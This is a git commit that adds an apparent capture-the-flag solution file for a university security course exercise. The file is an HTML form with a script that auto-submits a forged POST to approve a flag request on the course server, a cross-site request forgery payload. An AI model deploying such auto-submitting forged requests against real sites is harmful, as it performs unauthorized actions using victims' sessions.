dd7a1dc10a6dd2acf78550102e43c771dee6c18f
pedronunomacedo <pedronunomacedo@hotmail.com>
2022-12-03 16:06:54 +0000

    Routine commit

---
+++ Fichas/CTFs/Opcionais/Apply For Flag II /input.js
@@ -0,0 +1,9 @@
+<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/71b93db6ec908d8868bed4aba06b5977fc8aaaa8/approve" role="form">     
+    <div class="submit">         
+        <input type="submit" id="giveflag" value="Give the flag">    
+    </div> 
+</form>  
+
+<script type="text/javascript"> 	
+    document.querySelector('#giveflag').click(); 
+</script>
